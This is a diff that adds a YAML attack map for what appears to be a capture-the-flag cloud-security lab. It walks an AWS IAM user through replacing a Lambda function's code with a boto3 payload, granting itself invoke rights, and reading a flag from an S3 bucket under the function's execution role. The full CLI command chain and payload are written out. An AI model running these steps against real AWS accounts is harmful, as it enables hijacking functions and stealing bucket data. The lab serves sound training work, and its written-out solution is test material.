@@ -1,0 +1,109 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has lambda:UpdateFunctionCode, lambda:AddPermission, and
+        lambda:InvokeFunction permissions on the target Lambda function. The target
+        function runs under an execution role with S3 read access to the sensitive
+        target bucket.
+
+    - id: target-lambda
+      label: "Target Lambda"
+      type: resource
+      subType: lambda-function
+      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-lambda-005-to-bucket-target-lambda"
+      description: >
+        This Lambda function runs benign code but its execution role has s3:GetObject
+        access to the target S3 bucket. The function's resource-based policy initially
+        does not allow the starting user to invoke it. By replacing the function code
+        with a payload that reads the flag and granting yourself invocation rights,
+        you can use this function as a data exfiltration proxy running under its
+        privileged execution role.
+
+    - id: lambda-exec-role
+      label: "Lambda Exec Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-005-to-bucket-lambda-exec-role"
+      description: >
+        This IAM role is the execution role of the target Lambda function. It has
+        s3:GetObject access to the target S3 bucket. When you invoke the malicious
+        Lambda payload, the code executes under this role's identity -- allowing the
+        function to read the flag from the bucket and return it in the response.
+
+    - id: target-bucket
+      label: "Target S3 Bucket"
+      type: resource
+      subType: s3-bucket
+      isTarget: true
+      arn: "arn:aws:s3:::pl-prod-lambda-005-to-bucket-{account_id}-{suffix}"
+      description: >
+        The target S3 bucket containing the CTF flag stored as flag.txt. The Lambda
+        execution role has s3:GetObject access to this bucket. Your malicious Lambda
+        payload reads flag.txt and returns its contents in the invocation response,
+        completing the data exfiltration path.
+
+  edges:
+    - from: starting-principal
+      to: target-lambda
+      label: "lambda:UpdateFunctionCode"
+      description: >
+        Fetch the existing Lambda function configuration to identify the handler name
+        and execution role, then replace the function code with a malicious payload.
+        The payload reads flag.txt from the target S3 bucket using the execution
+        role's s3:GetObject permission and returns the flag value in the response body.
+      hints:
+        - "Fetch the existing function config with lambda:GetFunction to confirm the Handler field, then craft a payload whose filename matches the handler (e.g., handler lambda_function.lambda_handler requires a file named lambda_function.py). The payload should use boto3 to call s3:GetObject on the target bucket and return the contents in the response body."
+        - "After updating the code, use lambda:AddPermission to append a statement to the function's resource-based policy granting your user lambda:InvokeFunction -- this step is required because the function's initial resource policy does not allow the starting user to invoke it. Then invoke and read the flag from the response. Wait a few seconds after the code upload before invoking."
+        - "Browse to https://pathfinding.cloud/paths/lambda-005 for technique details."
+      commands:
+        - description: "Get the current function details including handler name and execution role"
+          command: "aws lambda get-function --function-name pl-prod-lambda-005-to-bucket-target-lambda --query '{Handler:Configuration.Handler,Role:Configuration.Role}'"
+        - description: "Create malicious Python payload that reads the flag from S3"
+          command: "cat > /tmp/lambda_function.py << 'EOF'\nimport boto3\nimport json\n\ndef lambda_handler(event, context):\n    s3 = boto3.client('s3')\n    bucket = event.get('bucket')\n    obj = s3.get_object(Bucket=bucket, Key='flag.txt')\n    flag = obj['Body'].read().decode('utf-8')\n    return {'statusCode': 200, 'body': flag}\nEOF"
+        - description: "Package the malicious code"
+          command: "cd /tmp && zip malicious_lambda.zip lambda_function.py"
+        - description: "Update the Lambda function with the malicious payload"
+          command: "aws lambda update-function-code --function-name pl-prod-lambda-005-to-bucket-target-lambda --zip-file fileb:///tmp/malicious_lambda.zip"
+        - description: "Grant self-invocation permission via resource-based policy"
+          command: "aws lambda add-permission --function-name pl-prod-lambda-005-to-bucket-target-lambda --statement-id allow-self-invoke --action lambda:InvokeFunction --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user"
+        - description: "Invoke the malicious Lambda and pass the target bucket name"
+          command: "aws lambda invoke --function-name pl-prod-lambda-005-to-bucket-target-lambda --payload '{\"bucket\": \"pl-prod-lambda-005-to-bucket-{account_id}-{suffix}\"}' /tmp/lambda-response.json && cat /tmp/lambda-response.json"
+
+    - from: target-lambda
+      to: lambda-exec-role
+      label: "lambda:InvokeFunction"
+      description: >
+        The malicious Lambda payload executes under the privileged execution role.
+        The function reads flag.txt from the target S3 bucket using the execution
+        role's s3:GetObject permission and returns the flag in the response body.
+      hints: []
+      commands: []
+
+    - from: lambda-exec-role
+      to: target-bucket
+      label: "s3:GetObject"
+      description: >
+        The Lambda execution role's s3:GetObject permission is exercised by the malicious
+        payload to read flag.txt from the target bucket. The flag value is returned in
+        the Lambda invocation response body, completing the data exfiltration path.
+      hints:
+        - "The flag arrives in the Lambda invocation response body -- read it from the output file written by lambda:InvokeFunction. The execution role's s3:GetObject permission did the actual bucket read; your payload was the mechanism."
+      commands:
+        - description: "Capture the CTF flag from the invocation response"
+          command: "cat /tmp/lambda-response.json"
+        - description: "Alternatively, retrieve flag.txt directly once you control the execution role's actions"
+          command: "aws s3 cp s3://pl-prod-lambda-005-to-bucket-{account_id}-{suffix}/flag.txt -"
